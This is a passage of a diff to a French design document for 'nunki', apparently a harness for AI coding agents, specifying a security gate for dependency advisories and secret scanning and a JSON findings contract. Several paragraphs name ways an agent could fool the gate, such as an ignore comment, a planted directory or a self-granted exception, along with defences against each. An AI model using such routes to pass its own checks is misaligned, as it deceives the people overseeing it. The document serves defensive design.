+   qu'elle n'avait pas encore atteint n'est pas reportée au-delà d'elle — le
+   registre des équivalences du projet la propose de nouveau à la campagne
+   suivante ; sur une campagne arrêtée, le report ne garde que le jumeau
+   exact d'un survivant décidé, et échoue fermé pour le reste.
+
+   Une campagne dont le script a fini n'est pas une campagne finie : ce
+   qu'il a lancé lui survit, rattaché à un autre parent. Avant d'être relue
+   et oubliée, elle est donc arrêtée de la même façon, et l'arrêt confirmé ;
+   sinon elle reste en vol, son dossier avec elle. Une campagne sur laquelle
+   le moteur n'a pas répondu n'est jamais oubliée : ne pas savoir n'est pas
+   savoir qu'elle est finie. Un conteneur ne compte comme disparu que si le
+   moteur, interrogé, l'a dit ; un moteur injoignable ne dit rien.
+
+8. **sécurité mécanique** : audit des dépendances, scan de secrets, analyse
+   statique, par stack, dans `security.sh`.
+
+   Elle est la porte du **codeur et de l'intégrateur**, jamais de l'agent de
+   sécurité : lui attaque ce qui tourne et doit des constats, pas un rapport
+   d'outil. C'est un script de stack, monté en lecture seule à
+   `/work/stack/security.sh`, absent ou non exécutable la porte **échoue**,
+   comme la batterie.
+
+   **Elle n'est pas la batterie.** Une batterie joue des tests et une
+   analyse statique — côté Rust, `clippy` et
+   `cargo deny check bans licenses sources`. Ce qu'aucune stack ne joue
+   aujourd'hui, ce sont les **vulnérabilités connues** et le **scan de
+   secrets**. Et l'intégrateur ne joue pas `prepush.sh` mais `system.sh` :
+   une vérification glissée dans la batterie ne tournerait jamais sur ses
+   commits, alors que le tableau l'exige « idem sur ses commits ». Enfin un
+   avis paraît **sans que le code bouge**, ce qui est une cadence à soi.
+
+   **Le contrat, et il est agnostique à la stack.** C'est la règle de la
+   porte 7 appliquée ici : `mutation.sh` émet une ligne JSON par survivant et
+   `nunki` ne sait rien de cargo-mutants. De même, `security.sh` fait tout le
+   travail propre à son écosystème et émet **un objet JSON par ligne**, un par
+   constat :
+
+   ```json
+   {"id":"…","kind":"unmaintained","where":"paste 1.0.15","via":"alloy",
+    "fix":"","accepted":"archivé en amont; alloy l'impose",
+    "was_at_base":true}
+   ```
+
+   - `id` — l'identifiant de l'écosystème, **opaque** pour `nunki` ;
+   - `kind` — `vulnerability`, `unmaintained`, `secret`, `lint` : les seules
+     classes sur lesquelles `nunki` raisonne ;
+   - `where` — où, pour un humain : paquet et version, ou `fichier:ligne`
+     pour un secret ;
+   - `fix` — ce qui le corrige. **Vide veut dire qu'il n'en existe pas**, et
+     c'est le discriminateur de tout ce qui suit ;
+   - `accepted` — la raison, lue par le script dans le mécanisme d'exception
+     **propre à l'écosystème** ; absent si le constat n'est pas accepté ;
+   - `was_at_base` — le constat était-il déjà là sur la base de la mission.
+     C'est ce qui sépare ce que la branche a apporté de ce que le dépôt
+     portait déjà ;
+   - `via` — la dépendance **directe** par laquelle le constat est entré,
+     absente quand il porte déjà sur une dépendance directe.
+
+   **`via` remplace une propagation dont on n'a pas besoin.** La question
+   semblait être « une lib que le propriétaire veut conserver protège-t-elle
+   aussi ses dépendances ? ». Elle ne se pose pas : **une dépendance
+   transitive n'est remplaçable par personne** — ce n'est pas le projet qui
+   la choisit, c'est son parent. Les seules issues sont de la monter dans la
+   contrainte du parent, ou de remplacer **le parent**, qui est une
+   dépendance directe et relève donc de la règle ordinaire. Ce qui manque à
+   l'agent n'est pas un héritage, c'est de savoir quel parent aller voir.
+
+   `nunki` décide sur ces sept champs et rien d'autre : ce qui n'était pas à
+   la base et n'est pas `accepted` est rouge ; ce qui y était déjà est un
+   constat ; `accepted` avec un `fix` non vide est une exception périmée.
+   Aucune de ces règles ne nomme un outil.
+
+   C'est ce qui rend les stacks suivantes possibles sans toucher au cœur :
+   Rust rend `deny.toml` et `cargo-deny`, Python son propre auditeur et sa
+   propre liste, Next.js la sienne, Solidity une analyse statique qui n'a
+   même pas de notion de dépendance vulnérable. Chacune garde **sa
+   convention**, ce qui est la raison même pour laquelle les exceptions
+   restent dans `deny.toml` côté Rust.
+
+   **Le fragment Rust, en exemple travaillé.** Tout ce qui suit est le
+   contenu de `security.sh` pour Rust, jamais du code de `nunki`.
+
+   **Un seul outil, `cargo-deny`**, plutôt que `cargo-deny` pour la porte et
+   `cargo-audit` pour le rapport. Deux outils, ce sont deux fichiers
+   d'exception — `deny.toml` et `.cargo/audit.toml` — que deux projets
+   n'utilisent pas forcément pareil. Une exception écrite
+   dans l'un et lue dans l'autre ne compte pas : la porte rougit sur ce qui
+   a été accepté, ou se tait sur ce qui ne l'a pas été.
+
+   La raison est plus forte que l'économie d'un fichier. Mesuré sur
+   cargo-deny 0.20.2, son rapport JSON porte, par constat :
+   `code` (la classe, d'où `kind`), `advisory.informational` (`unmaintained`
+   et les autres), une note `Solution: Upgrade to >=0.2.23` (d'où `fix`), et
+   **`graphs[].parents`, la chaîne de dépendances** — d'où `via`.
+   `cargo-audit` ne donne pas ce graphe. Le tri d'un fichier fait donc gagner
+   le champ qui manquait.
+
+   Un bémol assumé : `fix` sort d'une chaîne de notes et non d'un tableau
+   typé comme le `versions.patched` de `cargo-audit`. C'est au script de
+   l'extraire, donc cela ne remonte pas dans le cœur, mais c'est plus fragile
+   qu'un champ structuré.
+
+   **Les deux vues viennent de deux configurations, pas de deux outils.**
+   `--config <chemin>` désigne le fichier à lire, donc une configuration sans
+   `ignore` rend la vue **non filtrée** — tout, y compris ce qui est
+   accepté — et `deny.toml` rend la vue du projet, dont la liste `ignore`
+   fournit les `accepted`. Mesuré : avec l'avis dans `ignore`,
+   `cargo deny check advisories` répond `advisories ok`, sortie 0 ; avec une
+   configuration vide, il le signale.
+
+   Aucune isolation n'est nécessaire : ni bac à sable, ni clone, ni fichier
+   renommé. Ce ne serait pas vrai avec `.cargo/audit.toml` dans le tableau,
+   puisque `cargo-audit` n'a pas d'équivalent de `--config` et qu'il faudrait
+   sortir du répertoire du projet pour ne pas le lire. Un outil de moins,
+   et le problème avec.
+
+   **Et la base d'avis se lit hors ligne.** `--offline` avec un `db-path`
+   que l'hôte a rempli suffit : mesuré, cargo-deny trouve la
+   vulnérabilité sans réseau. Cela lève l'objection écrite dans le
+   `prepush.sh` de la stack Rust, qui excluait `cargo deny check advisories`
+   du conteneur parce que son étape `advisories` va chercher sa base sur
+   github.com — une forge, et aucune forge n'entre dans la liste blanche d'un
+   agent.
+
+   **Fin de l'exemple ; ce qui suit vaut pour toute stack.**
+
+   **La base d'avis ne peut pas être téléchargée par l'agent.** Vrai de tout
+   écosystème — un auditeur lit une base publiée quelque part, et cet endroit
+   est hors de la liste blanche d'un agent. Côté Rust c'est
+   `https://github.com/RustSec/advisory-db.git`, donc **github.com**, donc une
+   forge, et aucune forge n'entre dans la liste blanche d'un agent (4.1 bis ;
+   `nunki check` est rouge si une y apparaît). La base est donc rafraîchie
+   **sur l'hôte** et montée en lecture seule. Ce qui juge l'agent reste hors
+   de sa portée par construction, comme les scripts de stack — et une porte
+   dont la réponse dépend d'une base doit **dire la date de cette base**,
+   sans quoi elle rend un verdict sans dire de quand il date.
+
+   **Où elle vit, et qui la remplit**, en trois points.
+
+   Elle est **partagée** entre les projets et montée en lecture seule à un
+   chemin fixe du conteneur. Partagée parce que c'est la même donnée pour toute
+   stack donnée : un volume par slot dupliquerait un dépôt de plusieurs
+   centaines de méga-octets autant de fois qu'il y a de slots.
+
+   Un emplacement `~/.nunki/advisories/<stack>/`, aux côtés de ce que
+   `~/.nunki/` tient déjà de commun — les comptes, la consommation, le
+   registre des sessions, le jeton de forge — **ne tient pas**, et le
+   paragraphe « `nunki` ne la rafraîchit pas » deux points plus bas dit
+   pourquoi : l'outil possède la disposition de sa base et refuse un chemin
+   d'une autre forme. L'emplacement est donc celui de l'outil, sur l'hôte, et
+   la stack le déclare dans un fichier plat de son fragment — côté Rust,
+   `~/.cargo/advisory-db`.
+
+   Un **bind en lecture seule et non un volume nommé**, pour une raison
+   mécanique : un volume nommé ne s'écrit que depuis un conteneur, et
+   celui-ci est rempli par l'hôte. Le remplir en volume demanderait de lever
+   un conteneur auxiliaire pour rien. C'est la forme que les fichiers
+   d'identifiants de test utilisent déjà.
+
+   **`nunki` ne la rafraîchit pas.** L'outil possède la disposition de sa
+   base : mesuré, cargo-deny crée un `advisory-db-<empreinte>`
+   dérivé de l'URL, et **refuse** un chemin qui n'a pas cette forme. Un
+   `git clone` générique ne le satisferait donc pas, et chaque écosystème aura
+   la sienne. Le rafraîchissement est une commande de l'outil, sur l'hôte,
+   lancée par l'humain ou par sa CI ; `nunki` monte et rapporte. Aucune URL
+   déclarée par un projet n'est clonée par `nunki`, et l'agent reste sans
+   forge.
+
+   **Mais `nunki` en dit l'âge, et il le lit sans rien savoir de l'écosystème.**
+   Mesuré : `git -C <dir> log -1 --format=%cI` rend la date de la dernière
+   publication, les bases d'avis étant de simples dépôts git. La stack déclare le chemin de sa base dans un fichier
+   plat de son fragment — même famille qu'`allow.txt` et `caches.txt` — et le
+   script y pointe son outil. **Deux lignes** : le chemin, puis la commande de
+   l'outil qui la remplit. `nunki` répète cette commande mot pour mot à qui
+   doit remplir la base, et n'en nomme aucune lui-même : une phrase écrite
+   dans le cœur pour une stack est fausse pour les autres — mesuré (#165), une
+   mission Python s'est vu dire de lancer `cargo deny`. Un fragment d'avant la
+   seconde ligne n'en nomme pas : la phrase renvoie alors à son fichier.
+
+   **Absente ou illisible, la porte est `Unplayed` et non rouge.** C'est un
+   verdict sur la machine et non sur l'agent, la distinction que la batterie
+   fait déjà entre « il n'y a rien à jouer » et « c'est rouge ». Le flux
+   s'arrête, ce qui est honnête : une porte de sécurité qui n'a pas pu
+   consulter sa base ne doit pas rendre vert, et le remède tient en une
+   commande sur l'hôte.
+
+   **Et ce remède suffit, parce que `nunki verify` monte ce que l'hôte a
+   rempli depuis.** Le profil est écrit au lancement, et la base n'y est
+   montée que si elle existe alors — absente, le moteur créerait un répertoire
+   vide à sa place, lu comme « rien à signaler ». Remplie après, elle
+   n'atteint donc jamais le conteneur levé, et la porte restait injouable quoi
+   que fasse l'humain. `nunki verify` ajoute au profil levé les montages de
+   base qui lui manquent, **et eux seuls**, puis le relève comme tout relevage
+   (4.2) : le moteur recrée l'agent avec la base. Pas une régénération : elle
+   relirait le compte, le périmètre et les services, et changerait en pleine
+   mission ce que personne n'a demandé. Le fichier reste à l'humain seul :
+   il est au HQ, et celui qu'un `nunki` plus ancien a écrit porte encore le
+   jeton (4.3). Rien n'est recréé tant qu'une campagne de
+   mutation ou l'application lancée pour un rôle vit dans ce conteneur. La
+   porte dit lequel des deux remèdes vaut : la commande de la stack quand
+   l'hôte n'a pas la base, `nunki verify` quand il l'a.
+
+   **Et `nunki check` le dit avant.** Une base qu'une stack déclare et que la
+   machine n'a pas est rouge, avec la commande de la stack : trouvée à la
+   porte 8, elle coûte le premier run entier du codeur, au bout duquel le
+   moniteur s'arrête. Le contrôle ne crée jamais le répertoire, pour la même
+   raison que le montage.
+
+   Écarté pour l'instant, et nommé pour qu'on sache qu'il l'a été : un verbe
+   qui lancerait la commande de rafraîchissement de la stack **sur l'hôte**.
+   Ce serait le seul endroit où un script de fragment tournerait hors d'un
+   conteneur — une frontière de confiance nouvelle, pour une commodité.
+
+   **Et « une base par son nom » et « une révision » ne sont pas la même
+   chose, le compilateur le dit.** Deux fonctions de même signature,
+   `(&Path, &str)`, qui ne se distinguent que par un commentaire disant à
+   l'appelant laquelle prendre, sont une garde qui échoue. Une révision est
+   donc un type à part, et seul le résolveur en fabrique une à partir d'un
+   nom.
+
+   **Et « ce que la branche a apporté » n'a qu'une lecture.** La porte 4, la
+   porte 7 et le lanceur de campagne parlent tous du même ensemble ; la
+   porte 7 juge une campagne sur l'empreinte de ce sur quoi elle a tourné,
+   donc une divergence entre le lanceur et elle est une porte que rien ne peut
+   satisfaire : la porte réclame sans fin une campagne qui vient de tourner.
+   Le calcul vit donc **dans le
+   lanceur lui-même**, qui reçoit le nom de la base et non une liste : ce n'est
+   pas une règle que le prochain appelant doit connaître, c'est un appel qu'il
+   ne peut pas contourner.
+
+   **Et « la base » est celle dont la branche est partie.** Dans un slot —
+   un clone dont l'`origin` est le projet sur cette machine — `run::branch`
+   part de `origin/<base>` après l'avoir rafraîchie, tandis que la branche
+   locale du même nom est écrite une fois, à la création du slot, et ne bouge
+   plus jamais. Dès la deuxième mission les deux divergent : pour une branche
+   n'ayant **rien** touché, `dev...HEAD` nomme tous les fichiers de la mission
+   précédente, et `origin/dev...HEAD` n'en nomme aucun. Les portes 4, 7 et 8
+   lisent toutes cet ensemble : la campagne de mutation tournerait sur des
+   fichiers que la mission n'a jamais ouverts, le point de fourche de la
+   porte 8 serait en retard d'une fusion, et la porte 4 rougirait dès que la
+   base a gagné entre-temps un chemin protégé. La référence distante passe donc
+   d'abord, la locale restant le recours d'un clone dont l'origine ne porte
+   pas la base.
+
+   **Ce qui bloque est ce qui est nouveau depuis la base.** Un avis paru cette nuit dans une dépendance que la
+   branche n'a jamais touchée est déjà sur `dev` : arrêter la mission punit
+   le mauvais changement, pour une cause hors de portée de l'agent — la
+   réparer le ferait sortir de son périmètre, donc échouer la porte 4. Même
+   grammaire que la porte 4 (les chemins touchés) et la porte 7 (l'empreinte
+   des fichiers touchés) : **ce qui est nouveau depuis la base appartient à
+   la mission, ce qui préexiste appartient au projet.**
+
+   **Mais le préexistant est rendu, jamais tu.** C'est la condition de la
+   règle ci-dessus et non un ornement : une porte qui ne peut pas dire « je
+   sais, et ce n'est pas de cette mission » ment par omission. Chaque constat
+   préexistant paraît dans la sortie de la porte et dans `PR.md`, sans la
+   rougir. Le risque est assumé et nommé ici : **la dette d'un dépôt ne se
+   résorbe pas toute seule**, et aucune mission de fonctionnalité ne la
+   forcera. Son foyer est un audit — la sécurité mécanique jouée hors
+   mission, sur un dépôt entier.
+
+   Le contrat porte donc un champ de plus, `was_at_base`, et `nunki` décide
+   dessus sans savoir ce qu'est un lockfile : `was_at_base` faux et pas
+   `accepted` → rouge ; `was_at_base` vrai et pas `accepted` → constat. La
+   comparaison est **au script**, comme le reste de l'écosystème : `nunki`
+   lui passe la base, comme il passe les chemins touchés à `mutation.sh`.
+
+   **La base passée est un commit, jamais un nom de branche**, et c'est le
+   point de fourche — `git merge-base HEAD <base>`, résolu par `nunki` sur
+   l'hôte dans le slot. La raison est la forme de la copie propre de `HEAD` :
+   un clone détaché de l'arbre du slot, qui ne porte aucune branche locale, et
+   que le rafraîchissement ne nourrit que par `git fetch <arbre> HEAD` — donc
+   aucune référence de suivi ne bouge non plus. Un nom n'y résout rien :
+   `git rev-parse --verify dev` dans la copie répond « Needed a single
+   revision », et un constat que la base portait déjà revient
+   `was_at_base: false`, donc rouge. Le même script, dans le même conteneur,
+   avec le commit : `was_at_base: true`. Le point de fourche et non la tête de la base, parce que la porte 2
+   a déjà dit que la branche est en avance sur sa base : la fourche est un
+   ancêtre de `HEAD`, donc dans la copie par construction, tandis que la tête
+   peut avoir avancé depuis le clone et n'y être pas.
+
+   **Et une base illisible arrête le script au lieu de comparer à rien.** Un
+   code de sortie à lui — 70, à côté du 69 de la base d'avis — et `nunki` le
+   lit comme *non jouée* : un verdict sur la machine et non sur l'agent. Un
+   script qui avertirait sur stderr et poursuivrait rendrait tout nouveau, et
+   la porte rougirait sur ce que la branche n'a pas apporté, ce que cette
+   section demande précisément de ne pas faire.
+   Côté Rust, `git worktree add` sur la base puis la même commande dans cet
+   arbre. Il n'y a pas de voie « sans second checkout » : le `-f <lockfile>`
+   est propre à `cargo-audit`, et `cargo-deny` — mesuré — passe par les
+   métadonnées de cargo et refuse un dossier qui n'a qu'un manifeste et un
+   lockfile (« no targets specified in the manifest »). Le worktree est une
+   opération git locale et rien n'y est compilé : le coût réel est un
+   checkout, pas une construction.
+
+   Deux fuites cherchées et absentes, mesurées sur le raisonnement plutôt que
+   supposées : un codeur **ne peut pas déguiser** une vulnérabilité en
+   préexistante, parce que la comparaison porte sur les avis *rapportés* et
+   non sur la base de données — monter une lib vers une version vulnérable
+   fait paraître l'avis à `HEAD` et pas à la base. Et il ne peut pas
+   s'auto-délivrer une exception, `deny.toml` étant dans
+   `protected_paths.refuse`.
+
+   **Une troisième voie écartée : le seuil de sévérité.** Faire bloquer une
+   critique préexistante et pas une basse est la pratique courante ailleurs,
+   et c'est un seuil — que la porte 7 refuse explicitement deux points plus
+   haut (« Pas de seuil »). Un seuil ici casserait la cohérence de la
+   doctrine, et tous les avis ne portent pas de score. Écartée avec la voie
+   du délai de grâce, qui est le même seuil habillé en date.
+
+   **Un secret est toujours l'affaire d'un humain.** Tout ce qui suit sur les avis — le correctif, le remplacement,
+   l'exception qui se périme — ne veut rien dire pour un secret commité, et la
+   raison n'est pas sa gravité : **aucune action d'agent ne le ferme.** Le
+   retirer dans un commit suivant le laisse dans l'histoire de la branche, et
+   `nunki` n'en réécrit aucune. La porte 4 tient déjà exactement ce
+   raisonnement — « un commit interdit puis reverté laisse un arbre propre et
+   une histoire sale ». S'arrêter n'est donc pas une politique, c'est le seul
+   résultat honnête.
+
+   Des deux côtés de la base, et la différence n'est pas la gravité mais ce
+   que pousser cette branche ajoute : **nouveau dans la branche, cela rouge**
+   — la branche ne doit pas partir ; **déjà là avant elle, c'est rendu sans
+   rouge** — c'est déjà sur la base, et arrêter la mission ne le dé-fuite
+   pas. Dans les deux cas cela remonte à l'humain, et la révocation du secret
+   se fait hors de `nunki`.
+
+   **Et un faux positif doit pouvoir être dit une fois.** Les scanners de
+   secrets sont bruyants : fixtures de test, clés d'exemple, blobs qui
+   ressemblent à des clés. Sans un moyen de marquer « ce n'en est pas un »,
+   la mission se rearrête sur le même constat à chaque reprise. `accepted`
+   vaut donc pour un secret comme pour un avis — et comme un secret n'a pas de
+   `fix`, cette exception-là ne se retire jamais toute seule.
+
+   **Où elle vit : dans le HQ du projet**, à `hq/SECRETS.txt`, et pas dans le
+   mécanisme propre à l'outil, ni ailleurs :
+
+   - *Pas dans l'outil.* `trufflehog` n'a d'exception qu'un commentaire
+     `trufflehog:ignore` **dans la ligne de code** — une ligne que l'agent
+     édite légitimement, donc six caractères lui suffiraient à faire taire
+     son propre constat. C'est pourquoi le fragment passe `--no-ignore-tag` :
+     tout est rapporté, et ce qui est accepté se décide hors du conteneur.
+   - *Pas dans le dossier de mission.* L'exception partirait sous `archive/`
+     avec la mission, et le même secret arrêterait la suivante sur la même
+     ligne. C'est le problème « jour 1 / jour 25 » posé pour les avis, et il
+     se pose identique ici.
+   - *Pas dans le dépôt.* Un fichier d'exceptions de secrets est la liste des
+     endroits où il y a eu un secret, donc une carte ; et un dépôt se publie.
+     `deny.toml` y vit parce que la CI le lit et qu'un avis est public ;
+     aucune des deux raisons ne vaut ici.
+
+   Le HQ est à l'humain, il n'est jamais monté en entier, et il survit à
+   toutes les missions. Le fichier est monté **en lecture seule** dans le
+   conteneur et passé au script en argument, comme la base d'avis : la pile
+   dit ce dont elle a besoin, `nunki` dit où cela atterrit.
+
+   **Le point de montage n'est pas sous `/work`, et la règle vaut pour tout
+   ce qui juge l'agent.** Dans le conteneur, l'agent est
+   propriétaire de `/work` (le Dockerfile le lui donne), donc `mkdir -p
+   /work/advisories` réussit, tandis que `mkdir /nunki` est refusé — `/` est à
+   root. Un chemin monté *conditionnellement* sous `/work` est donc, le jour
+   où il n'est pas monté, un chemin que l'agent fabrique. Monté sous une
+   racine que l'image ne crée pas, Docker crée le parent au nom de root, et
+   l'absence de montage reste une absence.
+
+   Ce n'est pas une précaution théorique : **une base d'avis montée sous
+   `/work` ouvre une faille réelle.** Sans montage et avec le dossier de
+   l'agent à sa place, `security.sh` répond `exit=0` sans constat là où il
+   doit 69 — l'agent blanchit « je n'ai pas pu regarder » en porte verte, et
+   il suffit d'un `mkdir`. Les deux montages conditionnels de la
+   porte 8, la base d'avis et les décisions humaines, vivent donc sous cette
+   racine.
+
+   **Et c'est `nunki` qui l'écrit, jamais une main.** `nunki secret accept
+   <id> --because <raison>`, avec `secret list` et `secret forget` ; `--because`
+   obligatoire, pour la raison qui le rend obligatoire ailleurs — un risque
+   accepté sans raison n'est pas accepté, il est oublié. Le verbe est au
+   projet et non à une mission, ce qui est aussi la condition de l'agent de
+   sécurité lancé hors mission. L'identifiant refuse l'espace : une ligne est
+   `<id> <raison>`, et le script les sépare dessus.
+
+   **L'outil, côté Rust et côté tout le monde : `trufflehog`**, et non
+   `gitleaks`, malgré son fichier d'exceptions : **la porte d'image le
+   refuse, et elle a raison**.
+   Mesuré : son binaire 8.30.1, publié en mars 2026, embarque
+   `golang.org/x/crypto v0.35.0` de février 2025 — treize mois de retard à sa
+   propre sortie — et porte 33 avis critiques ou élevés **dont le correctif
+   existe**, sur `x/crypto`, `x/net` et `x/text`. Ajouter à une porte de
+   sécurité l'outil le moins entretenu de l'image n'est pas défendable, et
+   33 exceptions sous une raison unique ne sont pas une acceptation écrite.
+
+   `trufflehog` v3.97.5 porte `x/crypto v0.53.0`, plus récent que la version
+   qui corrige ces avis. `noseyparker` est **archivé**. `detect-secrets`
+   demanderait Python dans l'image. `kingfisher` est sérieux — MongoDB — mais
+   il est écrit en Rust, et
+   c'est ce qui l'écarte : mesuré, la porte d'image ne lit que les binaires
+   Go. Le choisir ne rendrait pas l'outil plus sûr, cela **cesserait de poser
+   la question** — et le prochain problème de cette forme arriverait sans
+   prévenir. Un binaire que la porte inspecte à chaque build vaut mieux qu'un
+   binaire qu'elle ne voit pas. Au passage : le crate `kingfisher` de
+   crates.io est un homonyme de 2023, sans rapport.
+
+   Ce n'est pas un fragment de stack mais un outil du **scan lui-même** : le
+   même pour Rust, Python ou Next.js, puisqu'un secret n'a pas d'écosystème.
+   Il entre dans l'image comme le reste, au build, sur l'hôte — jamais
+   téléchargé depuis un conteneur d'agent.
+
+   **Et son binaire Linux est dépouillé, donc la porte d'image ne l'inspecte
+   pas.** Mesuré : 36 Mo sans en-têtes de section contre 170 Mo pour la
+   version macOS, et aucun module lisible — là où celui de gitleaks expose les
+   siens, ce qui lui vaut son refus. Dit ici pour qu'on ne
+   prenne pas ce vert-là pour un verdict : sur ce binaire, la porte ne dit
+   pas « propre », elle ne dit rien. C'est une lacune de la porte, pas un
+   risque d'exécution — ce scanner lit des fichiers locaux dans un conteneur
+   sans réseau — et elle est notée plutôt que comblée.
+
+   Mesuré sur trufflehog 3.97.5, chaque champ du contrat y
+   trouve sa source :
+
+   - `SourceMetadata.Data.Git` donne `file`, `line` et `commit` ; les deux
+     premiers font le `where`, et le troisième donne `was_at_base`
+     **exactement**, par `git merge-base --is-ancestor <commit> <base>` : on
+     sait quel commit a introduit le secret, pas seulement qu'il est là ;
+   - `DetectorName` nomme la règle. L'`id` est composé —
+     `<commit>:<fichier>:<détecteur>:<ligne>` — parce que l'outil n'en publie
+     pas un, et qu'un constat doit pouvoir être nommé pour être accepté ;
+   - `fix` reste vide, parce qu'un secret n'en a pas. Il se révoque ;
+   - `Verified` dit si le secret a été essayé contre son service. Dans un
+     conteneur sans forge il vaut toujours `false`, et `nunki` ne s'en sert
+     pas : ce serait une sonde qui ne peut pas réussir.
+
+   **La vue non filtrée s'obtient, et elle est obligatoire.**
+   `--no-ignore-tag` rend aussi les constats qu'un commentaire
+   `trufflehog:ignore` fait taire — mesuré : deux jetons, un seul rendu par
+   défaut, les deux avec le drapeau. `nunki` le passe **toujours**, et la
+   raison est une règle et non un réglage : ce commentaire vit **dans la
+   ligne de code**, que l'agent édite légitimement. Sans ce drapeau, un agent
+   pourrait faire taire son propre secret en ajoutant six caractères.
+
+   **Donc une exception de secret ne vit pas dans le dépôt.** C'est l'inverse
+   de la règle des avis, et pour une raison qui prime ici :
+   là-bas `deny.toml` est protégé par les chemins refusés de la porte 4, et
+   une ligne de code ne peut pas l'être. La liste des constats acceptés vit
+   donc dans le home du projet, hors de portée, et `nunki` la rend en lecture
+   seule dans le dossier de mission — le chemin qu'`ALLOWLIST.txt` a déjà
+   ouvert : le propriétaire déclare hors d'atteinte, l'agent lit quand même.
+
+   Que les deux familles s'y prennent différemment n'est pas une faiblesse :
+   le contrat est le même, et comment chaque script l'honore est l'affaire de
+   ses outils. C'est précisément ce que l'agnosticisme achète.
+
+   **L'analyse statique**, la troisième famille que la porte porte, passe par
+   le même contrat : `kind: "lint"`, un `where` qui est un `fichier:ligne`,
+   pas de `fix`, pas de `via`. Ce que l'agent en fait est le cas ordinaire —
+   il le corrige, puisque c'est son propre code.
+
+   **Ce que l'agent fait d'un avis**, en trois cas :
+
+   1. **aucun avis** — on continue ;
+   2. **avis avec correctif** (`patched` non vide) — l'agent l'applique :
+      montée de version, batterie rejouée, commit. Aucun humain. C'est le cas
+      courant, y compris pour une dépendance **transitive**, qu'un
+      `cargo update -p` corrige sans toucher au parent dès que sa contrainte
+      autorise la version corrigée ;
+   3. **avis sans correctif** (`patched` vide) — et là seulement, deux voies.
+
+   **La voie a : changer de librairie**, et elle a elle-même trois cas :
+
+   - la librairie est **explicitement voulue** par le propriétaire : interdit
+     de la remplacer, on va en b ;
+   - rien n'a été dit sur elle : elle peut être remplacée. L'agent le tente,
+     la vérification est automatique — il rejoue `security.sh`, qui lui dit
+     s'il a échangé un avis contre un autre — et il **le dit dans `PR.md`**,
+     parce qu'un changement de dépendance se relit ;
+   - c'est une dépendance **d'une librairie explicitement voulue** : le
+     parent ne peut pas être remplacé, on va en b.
+
+   « Explicitement voulue » doit être **lisible par une machine**, sans quoi
+   les deux premiers cas ne se distinguent pas. C'est une section de
+   `nunki.yaml`, qui vit hors du dépôt et n'est
+   **jamais montée**, donc que l'agent ne peut pas réécrire :
+
+   ```yaml
+   dependencies:
+     keep:
+       - name: tokio
+         because: the runtime the whole service is built on
+   ```
+
+   Mais l'agent doit quand même la **lire**, sinon il tenterait le
+   remplacement et dépenserait la tentative que `keep` existe pour épargner.
+   Le dépôt a déjà cette forme pour le périmètre : le propriétaire déclare
+   hors de portée, `nunki` rend la liste effective en lecture seule dans le
+   dossier de mission, l'agent la lit — c'est `ALLOWLIST.txt`. `keep` suit le
+   même chemin, et l'agent n'a rien à analyser puisqu'il lit de la prose.
+
+   **Ce qui la fait respecter est la revue humaine, et c'est dit comme tel.**
+   Un changement de dépendance est visible dans le diff d'une pull request
+   que personne ne fusionne sans la lire. C'est un confort au sens de 3.2, pas
+   une enforcement : rien dans le conteneur n'empêche l'agent de passer
+   outre. Le rendre mécanique demanderait à chaque stack de détecter qu'une
+   librairie `keep` a disparu de son manifeste — beaucoup de travail par
+   écosystème pour un cas rare, et c'est pourquoi ce n'est pas fait.
+
+   **La liste part vide et se remplit une entrée à la fois**, plutôt que
+   pré-remplie à `nunki init` avec les librairies déclarées. Deux raisons : lister les dépendances d'un projet,
+   c'est analyser `Cargo.toml`, `pyproject.toml` ou `package.json` — la
+   stack de retour dans le cœur, ou un script de fragment de plus dans chaque
+   écosystème ; et `init` ne tourne qu'une fois, donc une librairie ajoutée
+   au deuxième mois ne serait jamais proposée, alors que c'est justement
+   celle à laquelle personne n'a pensé. Le seul moment où `keep` compte est
+   celui où un remplacement est envisagé — rare — et la question se pose alors
+   sur **une** librairie, à laquelle le propriétaire répond une fois. Chaque
+   entrée porte ainsi une raison, parce qu'elle a été écrite en réponse à une
+   vraie question.
+
+   **La voie b : accepter le risque, et c'est l'humain.** C'est un jugement
+   que rien ne peut vérifier, donc la même règle que pour un survivant
+   « équivalent » de la porte 7 : *cet avis n'est pas à l'agent de le
+   donner*. L'exception s'écrit dans la liste `ignore` de `deny.toml`, avec
+   sa `reason`, et **non** au HQ : c'est la convention de Rust, `deny.toml` doit vivre
+   dans le dépôt puisque la CI s'en sert, et une exception de sécurité y est
+   **relue en pull request** au lieu d'être enfouie là où personne ne la
+   voit. L'agent ne peut pas l'écrire lui-même : `nunki init` met déjà
+   `deny.toml` dans `protected_paths.refuse`, et la porte 4 refuse tout
+   commit qui y touche.
+
+   Une raison qui **nomme** vaut mieux qu'une qui dit « risque accepté ». Le
+   cas le plus fréquent d'acceptation n'est pas « pas de correctif » mais
+   « le code vulnérable n'est pas atteignable » — que `cargo-deny` ne sait
+   pas voir, et dont la raison peut au moins nommer la
+   fonction.
+
+   **Une exception se revérifie à chaque mission, et se retire toute seule.**
+   Une exception posée au jour 1 faute de correctif n'a plus lieu d'être le
+   jour où le correctif sort, et personne n'y repensera. Une date
+   d'expiration est **écartée** :
+   cargo-deny 0.20.2 n'en accepte pas (mesuré : la liste `ignore` ne connaît
+   que `id` et `reason`), et surtout une date est une devinette là où la
+   vraie condition est mécanique. À chaque passage de la porte, pour chaque
+   id de `ignore` :
+
+   - `patched` vide → l'exception vaut encore, on continue ;
+   - `patched` non vide → **l'exception est périmée, un correctif existe :
+     applique-le**, et retire l'exception.
+
+   **Une exception qu'aucun correctif ne peut périmer.** Deux cas, et une
+   seule règle.
+
+   Le premier : les avis qui **ne sont pas des vulnérabilités** —
+   `unmaintained`, `unsound`, `notice`, `yanked`. Leur `fix` est vide *par
+   nature* et le restera, donc la revérification ci-dessus ne les touchera
+   jamais. Le second : un **faux positif de secret**, qui n'a pas de `fix`
+   non plus et n'en aura jamais.
+
+   Dans les deux cas l'exception est **permanente**, et il vaut mieux le dire
+   que de faire semblant qu'elle expirera. Ce ne sont pas deux mécanismes :
+   c'est le même, et la règle est que `nunki` distingue, dans ce qu'il rend,
+   une exception qu'un correctif peut lever d'une exception que rien ne
+   lèvera. Les premières sont une dette qui se résorbe ; les secondes sont
+   une décision qui se relit, et leur seule sortie est la voie a — changer de
+   librairie, ou l'outil qui crie à tort.
+
+   `kind` est dans le contrat pour que cette règle se dise sans nommer un
+   outil : Python et Next.js porteront la même distinction sous d'autres noms.
+
+   **Exemple réel.** Un projet dont `alloy` dépend de `paste`, que RUSTSEC-2024-0436 signale
